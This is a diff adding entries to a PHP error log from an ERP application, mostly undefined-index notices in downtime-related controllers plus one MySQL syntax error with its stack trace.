+[04-Jan-2023 14:55:47 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:55:47 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:55:55 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
+[04-Jan-2023 14:55:55 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:55:55 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:56:19 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/deleteDownTime.php on line 6
+[04-Jan-2023 14:57:07 Asia/Kolkata] PHP Notice:  Undefined index: __user_logid in /var/www/html/erpm/AppCode/nHead.php on line 2
+[04-Jan-2023 14:57:15 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:57:23 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:57:23 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:57:39 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
+[04-Jan-2023 14:57:39 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:57:39 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:57:55 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/deleteDownTime.php on line 6
+[04-Jan-2023 14:58:27 Asia/Kolkata] PHP Fatal error:  Uncaught Exception: Problem preparing query (call GetDTDetailsByID(""")) You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '""")' at line 1 in /var/www/html/erpm/AppData/Class/MysqliDb.php:1514
+Stack trace:
+#0 /var/www/html/erpm/AppData/Class/MysqliDb.php(1127): MysqliDb->_prepareQuery()
+#1 /var/www/html/erpm/AppData/Class/MysqliDb.php(495): MysqliDb->_buildQuery()
+#2 /var/www/html/erpm/Controller/getDataForDownTime.php(10): MysqliDb->query()
+#3 {main}
+  thrown in /var/www/html/erpm/AppData/Class/MysqliDb.php on line 1514
+[04-Jan-2023 14:58:59 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getDataForDownTime.php on line 7
+[04-Jan-2023 14:59:07 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:59:07 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
+[04-Jan-2023 14:59:15 Asia/Kolkata] PHP Notice:  Undefined index: ID in /var/www/html/erpm/Controller/getCommentDownTime.php on line 6
+[04-Jan-2023 14:59:15 Asia/Kolkata] PHP Notice:  Undefined index: Emp in /var/www/html/erpm/Controller/getCommentDownTime.php on line 7
+[04-Jan-2023 14:59:15 Asia/Kolkata] PHP Notice:  Undefined index: Emp1 in /var/www/html/erpm/Controller/getCommentDownTime.php on line 8
